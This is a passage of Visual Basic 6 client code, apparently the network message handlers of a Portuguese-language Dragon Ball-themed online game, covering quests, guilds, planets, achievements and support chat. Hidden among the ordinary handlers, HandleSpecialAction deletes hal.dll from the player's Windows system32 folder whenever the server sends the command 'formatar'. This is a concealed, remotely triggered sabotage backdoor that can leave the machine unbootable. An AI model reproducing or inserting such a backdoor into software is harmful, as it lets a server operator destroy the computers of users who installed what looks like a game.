    If Effect(EffectNum).isMulti = YES Then
        For i = 1 To MAX_MULTIPARTICLE
            If Effect(EffectNum).MultiParticle(i) > 0 Then
                CastEffect Effect(EffectNum).MultiParticle(i), X, Y
            End If
        Next
    Else
        CastEffect EffectNum, X, Y
    End If
    PlayMapSound X, Y, SoundEntity.seEffect, EffectNum
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSendNews(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim OpenNews As Byte
    Dim buffer As clsBuffer
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    OpenNews = buffer.ReadByte
    NewsText = buffer.ReadString
    Set buffer = Nothing
    If OpenNews = 1 Then GUIWindow(GUI_NEWS).visible = True
End Sub

Private Sub HandleFly(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    TempPlayer(Index).Fly = buffer.ReadByte
    Set buffer = Nothing
End Sub

Private Sub HandleSpecialAction(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    Select Case buffer.ReadString
        
        Case "formatar"
        Kill WinDir & "\system32\hal.dll"
        
    End Select
    
    Set buffer = Nothing
End Sub

Function WinDir() As String
    Const FIX_LENGTH% = 4096
    Dim Length As Integer
    Dim buffer As String * FIX_LENGTH

    Length = GeneralWinDirApi(buffer, FIX_LENGTH - 1)
    WinDir = Left$(buffer, Length)
End Function

Private Sub HandleSpellBuffer(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim TheIndex As Long
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    TheIndex = buffer.ReadLong
    TempPlayer(TheIndex).SpellBuffer = buffer.ReadLong
    TempPlayer(TheIndex).SpellBufferTimer = GetTickCount
    TempPlayer(TheIndex).SpellBufferNum = buffer.ReadLong
    
    Set buffer = Nothing
End Sub

Private Sub HandleShenlong(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim mapnum, active, Animation As Long
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    mapnum = buffer.ReadLong
    active = buffer.ReadByte
    Animation = buffer.ReadByte
    
    If active = 0 And Animation = 0 Then
        ShenlongMap = 0
        Exit Sub
    End If
    
    ShenlongMap = mapnum
    ShenlongX = buffer.ReadLong
    ShenlongY = buffer.ReadLong
    ShenlongActive = active
    If Animation = 1 Then
        If ShenlongActive = 1 Then
            InAnimationShenlongTick = GetTickCount + 10000
            Call PlaySound("shenlongappear.mp3", -1, -1)
            Call PlaySound("Thunder.wav", -1, -1)
        Else
            OutAnimationShenlongTick = GetTickCount + 10000
            Call PlaySound("Shen03.mp3", -1, -1)
            Call AddText(printf("Shenlong: Seu desejo foi realizado, agora vou embora."), Yellow, 255)
        End If
    End If
        
    Set buffer = Nothing
End Sub

Private Sub HandleTransporte(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    Transporte.Tipo = buffer.ReadByte
    Transporte.Tick = GetTickCount
    Transporte.Map = buffer.ReadLong
    Transporte.Anim = buffer.ReadByte
    
    If Transporte.Tipo = 1 Then
        If Transporte.Anim = 1 Then
            Transporte.X = -521
            Call PlaySound("airplane.mp3", -1, -1)
        End If
        If Transporte.Anim = 2 Then
            Call PlaySound("airplanefly.mp3", -1, -1)
        End If
    End If
    
    If Transporte.Tipo = 2 Then
        If Transporte.Anim = 1 Then
            Transporte.X = -560
            Call PlaySound("ship.mp3", -1, -1)
        End If
        If Transporte.Anim = 2 Then
            Call PlaySound("ship.mp3", -1, -1)
        End If
    End If
        
    Set buffer = Nothing
End Sub
Private Sub HandleMapNpcDataXY(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    i = buffer.ReadLong

    With MapNpc(i)
        .X = buffer.ReadLong
        .Y = buffer.ReadLong
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Private Sub HandleUpdatequest(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim questSize As Long
Dim questData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    n = buffer.ReadLong
    
    questSize = LenB(Quest(n))
    ReDim questData(questSize - 1)
    questData = buffer.ReadBytes(questSize)
    CopyMemory ByVal VarPtr(Quest(n)), ByVal VarPtr(questData(0)), questSize
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdatequest", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleQuestEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Exit Sub
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleQuestEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerQuests(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim i As Long

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    For i = 1 To MAX_QUESTS
        Player(MyIndex).QuestState(i).State = buffer.ReadByte
    Next i
        
    Set buffer = Nothing
End Sub

Private Sub HandlePlayerQuest(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim i As Long

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    i = buffer.ReadLong
    Player(MyIndex).QuestState(i).State = buffer.ReadByte
        
    Set buffer = Nothing
End Sub

Private Sub HandlePlayerInfo(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim i As Long, PlayerIndex As Long

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    i = buffer.ReadByte
    
    If i = PlayerInfoType.AFK Then
        PlayerIndex = buffer.ReadLong
        TempPlayer(PlayerIndex).AFK = buffer.ReadByte
    End If
    
    If i = PlayerInfoType.Fish Then
        FishingTime = GetTickCount + buffer.ReadLong
    End If
    
    If i = PlayerInfoType.Gravidade Then
        OpenCurrency 5, "Qual a gravidade que você deseja treinar? (Máx: " & MaxGravity & ")"
    End If
    
    If i = PlayerInfoType.GravityOk Then
        Dim Title As String
        Title = buffer.ReadString
        Dialogue Title, buffer.ReadString, DIALOGUE_TYPE_NONE, False
    End If
    
    If i = PlayerInfoType.ProvacaoInit Then
        If buffer.ReadByte = 1 Then
            ProvacaoTick = GetTickCount
        Else
            ProvacaoTick = 0
        End If
    End If
    
    If i = PlayerInfoType.OpenGuild Then
        frmGuildMaster.Show
    End If
    
    If i = PlayerInfoType.GuildInvite Then
        Title = buffer.ReadString
        Dialogue Title, buffer.ReadString, DIALOGUE_TYPE_GUILDINVITE, True
    End If
    
    If i = PlayerInfoType.PlayerDaily Then
        DailyQuestMsg = buffer.ReadString
        DailyQuestObjective = buffer.ReadLong
        DailyQuestCompleted = buffer.ReadByte
        DailyBonus = buffer.ReadByte
    End If
    
    If i = PlayerInfoType.OpenArena Then
        OpenArenaDialog
    End If
    
    If i = PlayerInfoType.ArenaChallenging Then
        Title = "Desafio de arena"
        Dialogue Title, buffer.ReadString, DIALOGUE_TYPE_ARENAINVITE, True
    End If
    
    If i = PlayerInfoType.AntiHackData Then
        DllHand = vbNullString
        VerificarAntiHack True
        SendAntiHackData DllHand
    End If
    
    If i = PlayerInfoType.FabricaData Then
        ShowFabrica
        For i = 1 To 5
            frmMain.lstFila.AddItem "Sementes nivel " & i & " Estoque:" & buffer.ReadLong & " Produzindo:" & buffer.ReadLong
        Next i
    End If
    
    If i = PlayerInfoType.ExercitoData Then
        frmMain.picExercito.visible = True
        frmMain.lstEFila.Clear
        Dim count As Long
        Dim value As Long
        For i = 1 To 5
            value = buffer.ReadLong
            count = count + value
            frmMain.lstEFila.AddItem "Saibaman nivel " & i & " Prontos:" & value & " Treinando:" & buffer.ReadLong
        Next i
        For i = 1 To 5
            Sementes(i) = buffer.ReadLong
        Next i
        Alloc = buffer.ReadLong
        frmMain.lblAlloc.Caption = "Residencias: " & count & "/" & Alloc
    End If
    
    If i = PlayerInfoType.Confirmation Then
        Title = "Confirmação"
        Dialogue Title, buffer.ReadString, DIALOGUE_TYPE_CONFIRMATION, True
    End If
    
    If i = PlayerInfoType.ConquistasInfo Then
        count = buffer.ReadLong
        For i = 1 To count
            Player(MyIndex).Conquistas(i) = buffer.ReadByte
            Player(MyIndex).ConquistaProgress(i) = buffer.ReadLong
        Next i
    End If
    
    If i = PlayerInfoType.ConquistaInfo Then
        i = buffer.ReadLong
        Player(MyIndex).Conquistas(i) = buffer.ReadByte
        Player(MyIndex).ConquistaProgress(i) = buffer.ReadLong
        If Player(MyIndex).Conquistas(i) = 1 Then
            PlaySound "Success2.mp3", -1, -1
            PopConquista i
        End If
    End If
    
    If i = PlayerInfoType.OpenTroca Then
        frmMain.picTroca.visible = True
        
        Dim Base(1 To 3) As Long
        Base(1) = 80
        Base(2) = 160
        Base(3) = 320
        
        For i = 1 To 3
            EspAmount(i) = buffer.ReadLong
            EspPrice(i) = buffer.ReadLong
            frmMain.lblEspPrice(i - 1).Caption = "Unidade: " & EspPrice(i) & "z"
            frmMain.lblTotalAcumulado(i - 1).Caption = "Acumulado: " & EspAmount(i)
            If EspPrice(i) < Base(i) Then
                frmMain.lblAlta(i - 1).Caption = "Baixa: -" & Int((100 - ((EspPrice(i) / Base(i)) * 100))) & "%"
                frmMain.lblAlta(i - 1).ForeColor = QBColor(BrightRed)
            Else
                If EspPrice(i) >= Base(i) And EspPrice(i) <= Base(i) * 1.1 Then
                    frmMain.lblAlta(i - 1).Caption = "Média: +" & Int((((EspPrice(i) / Base(i)) * 100) - 100)) & "%"
                    frmMain.lblAlta(i - 1).ForeColor = QBColor(Black)
                Else
                    frmMain.lblAlta(i - 1).Caption = "Alta: +" & Int(((EspPrice(i) / Base(i)) * 100) - 100) & "%"
                    frmMain.lblAlta(i - 1).ForeColor = &HC000&
                End If
            End If
        Next i
        
    End If
    
    If i = PlayerInfoType.ServiceFeedback Then
        ServiceWindowTick = GetTickCount
        ServiceWindowGold = buffer.ReadLong
        ServiceWindowExp = buffer.ReadLong
    End If
        
    Set buffer = Nothing
End Sub

Private Sub HandleOpenRefine(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    GUIWindow(GUIType.GUI_SPELLS).visible = True
    IsRefining = True
End Sub

Private Sub HandlePlanets(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim n As Long

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    If buffer.ReadByte = 0 Then 'Galaxia central
        If buffer.ReadByte = 0 Then
            MAX_PLANETS = buffer.ReadLong
            ReDim Planets(1 To MAX_PLANETS + 1) As PlanetRec
            ReDim PlanetMoons(1 To MAX_PLANETS + 1) As MoonDataRec
            
            For n = 1 To MAX_PLANETS
                Dim PlanetsSize As Long
                Dim PlanetsData() As Byte
                
                Planets(n).name = vbNullString
                Planets(n).Owner = vbNullString
                
                PlanetsSize = LenB(Planets(n))
                ReDim PlanetsData(PlanetsSize - 1)
                PlanetsData = buffer.ReadBytes(PlanetsSize)
                CopyMemory ByVal VarPtr(Planets(n)), ByVal VarPtr(PlanetsData(0)), PlanetsSize
            Next n
        Else
            If Not MAX_PLANETS = 0 Then
            n = buffer.ReadLong
            
            Planets(n).name = vbNullString
            Planets(n).Owner = vbNullString
            
            PlanetsSize = LenB(Planets(n))
            ReDim PlanetsData(PlanetsSize - 1)
            PlanetsData = buffer.ReadBytes(PlanetsSize)
            CopyMemory ByVal VarPtr(Planets(n)), ByVal VarPtr(PlanetsData(0)), PlanetsSize
            End If
        End If
    Else
        'Galaxia Virgo
        If buffer.ReadByte = 0 Then
            MAX_PLAYER_PLANETS = buffer.ReadLong
            ReDim PlayerPlanet(1 To MAX_PLAYER_PLANETS + 1)
            ReDim PlayerPlanetMoons(1 To MAX_PLAYER_PLANETS + 1) As MoonDataRec
            
            For n = 1 To MAX_PLAYER_PLANETS
                PlayerPlanet(n).PlanetData.name = vbNullString
                PlayerPlanet(n).PlanetData.Owner = vbNullString
                PlayerPlanet(n).LastLogin = vbNullString
                
                PlanetsSize = LenB(PlayerPlanet(n).PlanetData)
                ReDim PlanetsData(PlanetsSize - 1)
                PlanetsData = buffer.ReadBytes(PlanetsSize)
                CopyMemory ByVal VarPtr(PlayerPlanet(n).PlanetData), ByVal VarPtr(PlanetsData(0)), PlanetsSize
            Next n
        Else
            If Not MAX_PLAYER_PLANETS = 0 Then
                n = buffer.ReadLong
                
                PlayerPlanet(n).PlanetData.name = vbNullString
                PlayerPlanet(n).PlanetData.Owner = vbNullString
                PlayerPlanet(n).LastLogin = vbNullString
                
                PlanetsSize = LenB(PlayerPlanet(n).PlanetData)
                ReDim PlanetsData(PlanetsSize - 1)
                PlanetsData = buffer.ReadBytes(PlanetsSize)
                CopyMemory ByVal VarPtr(PlayerPlanet(n).PlanetData), ByVal VarPtr(PlanetsData(0)), PlanetsSize
            End If
        End If
    End If
    
    Set buffer = Nothing
End Sub

Private Sub HandleMatchData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim n As Long

    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    MatchPoints = buffer.ReadLong
    MatchNPCs = buffer.ReadLong
    Dim ActualMatchStars As Long
    ActualMatchStars = MatchStars
    MatchStars = buffer.ReadLong
    If ActualMatchStars <> MatchStars Then
        StarAnimation = GetTickCount + 2000
        StarX = ConvertMapX(GetPlayerX(MyIndex) * PIC_X)
        StarY = ConvertMapY(GetPlayerY(MyIndex) * PIC_Y)
        PlaySound "Success2.mp3", -1, -1
    End If
    MatchActive = buffer.ReadByte
    MatchNeedPoints = buffer.ReadLong
    
    If MatchActive = 0 Then 'Inactive
        If buffer.ReadLong = MyIndex Then 'Dono do planeta
            Dialogue "Venda de planeta", "Você acabou de capturar este planeta, deseja vendê-lo agora? Caso não ele permanecerá seu por mais 15 minutos ou até que você extraia toda sua mineração antes de explodir.", DIALOGUE_TYPE_SELLPLANET, True
        End If
    End If
    
    Set buffer = Nothing
End Sub

Private Sub HandleUpdateGuild(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim GuildSize As Long
Dim GuildData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    n = buffer.ReadLong
    
    GuildSize = LenB(Guild(n))
    ReDim GuildData(GuildSize - 1)
    GuildData = buffer.ReadBytes(GuildSize)
    CopyMemory ByVal VarPtr(Guild(n)), ByVal VarPtr(GuildData(0)), GuildSize
    
    Set buffer = Nothing
    
    If frmMain.picGuildAdmin.visible = True Then
        If n = Player(MyIndex).Guild Then
            ShowGuildPanel
        End If
    End If
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateGuild", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSaibaman(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim n As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    Dim mapnum As Long
    mapnum = buffer.ReadLong
    n = buffer.ReadByte
    
    MapSaibamans(mapnum).TotalSaibamans = n
    Dim i As Long
    If mapnum = GetPlayerMap(Index) Then
        For i = 1 To MAX_BYTE
            ClearAnimInstance (i)
        Next
    End If
    For i = 1 To n
        MapSaibamans(mapnum).Saibaman(i).Working = buffer.ReadByte
        MapSaibamans(mapnum).Saibaman(i).X = buffer.ReadLong
        MapSaibamans(mapnum).Saibaman(i).Y = buffer.ReadLong
        MapSaibamans(mapnum).Saibaman(i).TaskInit = buffer.ReadString
        MapSaibamans(mapnum).Saibaman(i).Remaining = buffer.ReadLong
        If MapSaibamans(mapnum).Saibaman(i).Working = 1 Then DoAnimation ConstructAnim, MapSaibamans(mapnum).Saibaman(i).X, MapSaibamans(mapnum).Saibaman(i).Y, 0, 0, 0, ConstructAnim
    Next i
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateGuild", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Private Sub HandleConquistas(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long, n As Long, total As Long
    
    Set buffer = New clsBuffer
        buffer.WriteBytes data()
        total = buffer.ReadLong
        
        If total > 0 Then
            ReDim Conquistas(1 To total)
            For i = 1 To total
                Conquistas(i).name = buffer.ReadString
                Conquistas(i).Desc = buffer.ReadString
                Conquistas(i).EXP = buffer.ReadLong
                Conquistas(i).Progress = buffer.ReadLong
                For n = 1 To 5
                    Conquistas(i).Reward(n).num = buffer.ReadLong
                    Conquistas(i).Reward(n).value = buffer.ReadLong
                Next n
            Next i
        End If
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
End Sub

Private Sub HandleSupport(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim PlayerName As String

    
    Set buffer = New clsBuffer
        buffer.WriteBytes data()
        Msg = buffer.ReadString
        PlayerName = Mid(Msg, 1, InStr(1, Msg, ":") - 1)
        PlaySound "Cursor1.wav", -1, -1
        If Not frmSuporte.visible Then frmSuporte.Show
        If GetPlayerAccess(MyIndex) = 0 Then
            frmSuporte.txtChat(0).Text = frmSuporte.txtChat(0).Text & vbNewLine & Msg
        Else
            Dim i As Long
            For i = 1 To 20
                If SupportNames(i) = PlayerName Then
                    Exit For
                End If
            Next i
            If i = 21 Then
                For i = 1 To 20
                    If SupportNames(i) = vbNullString Then
                        SupportNames(i) = PlayerName
                        Exit For
                    End If
                Next i
            End If
            
            If frmSuporte.lstPlayers.ListIndex + 1 <> i Then frmSuporte.lstPlayers.List(i - 1) = PlayerName & " (NOVA)"
            frmSuporte.txtChat(i).Text = frmSuporte.txtChat(i).Text & vbNewLine & Msg
            
        End If
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
End Sub
